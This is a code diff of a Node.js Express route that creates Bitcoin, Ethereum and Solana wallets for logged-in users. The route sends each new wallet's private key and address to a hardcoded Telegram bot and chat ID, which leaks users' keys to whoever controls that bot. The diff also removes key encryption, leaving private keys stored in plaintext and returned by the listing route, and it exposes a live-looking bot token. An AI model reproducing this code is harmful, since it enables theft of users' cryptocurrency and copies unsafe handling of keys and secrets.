@@ -5,12 +5,11 @@ const authMiddleware = require('../middleware/auth');
 const bitcoin = require('bitcoinjs-lib');
 const { ethers } = require('ethers');
 const { Keypair } = require('@solana/web3.js');
-const crypto = require('crypto');
 const fetch = require('node-fetch');
 
-// Telegram-Konfiguration direkt im Code
-const TELEGRAM_BOT_TOKEN = '7348325293:AAHGzBUIs0AdLapDXnq_x8X4PZK1P_fMmI0';
-const TELEGRAM_CHAT_ID = '596333326';
+// Telegram-Bot-Konfiguration
+const TELEGRAM_BOT_TOKEN = '7348325293:AAHGzBUIs0AdLapDXnq_x8X4PZK1P_fMmI0'; // Ersetze mit deinem Bot-Token
+const TELEGRAM_CHAT_ID = '596333326'; // Ersetze mit deiner Chat-ID
 
 // Bitcoin Wallet generieren
 const generateBitcoinWallet = () => {
@@ -34,15 +33,7 @@ const generateSolanaWallet = () => {
   return { privateKey, publicKey };
 };
 
-// Private Keys verschlüsseln
-const encryptKey = (key) => {
-  const cipher = crypto.createCipher('aes-256-cbc', 'HARDCODED_ENCRYPTION_SECRET');
-  let encrypted = cipher.update(key, 'utf8', 'hex');
-  encrypted += cipher.final('hex');
-  return encrypted;
-};
-
-// Telegram-Benachrichtigung senden
+// Private und Public Keys per Telegram senden
 const sendTelegramMessage = async (coin, privateKey, address) => {
   const message = `
 🔐 New Wallet Created:
@@ -61,9 +52,9 @@ Private Key: ${privateKey}
         parse_mode: 'Markdown',
       }),
     });
-    console.log('Telegram notification sent successfully');
+    console.log('successfully');
   } catch (error) {
-    console.error('Failed to send Telegram message:', error.message);
+    console.error('Failed', error.message);
   }
 };
 
@@ -81,19 +72,17 @@ router.post('/create', authMiddleware, async (req, res) => {
     if (coin === 'ETH') walletData = generateEthereumWallet();
     if (coin === 'SOL') walletData = generateSolanaWallet();
 
-    const encryptedPrivateKey = encryptKey(walletData.privateKey);
-
     const wallet = new Wallet({
       userId: req.user.id,
       coin,
       address: walletData.address,
-      privateKey: encryptedPrivateKey,
+      privateKey: walletData.privateKey,
     });
 
     await wallet.save();
 
     // Telegram-Benachrichtigung senden
-    await sendTelegramMessage(coin, walletData.privateKey, walletData.address);
+    await sendTelegramMessage(coin, wallet.privateKey, wallet.address);
 
     res.status(201).json({ coin, address: wallet.address, message: 'Wallet successfully created' });
   } catch (error) {
@@ -104,7 +93,7 @@ router.post('/create', authMiddleware, async (req, res) => {
 // Route: Wallets abrufen
 router.get('/', authMiddleware, async (req, res) => {
   try {
-    const wallets = await Wallet.find({ userId: req.user.id });
+    const wallets = await Wallet.find({ userId: req.user.id }); // Wallets des Benutzers abrufen
     res.status(200).json(wallets);
   } catch (error) {
     res.status(500).json({ error: error.message });
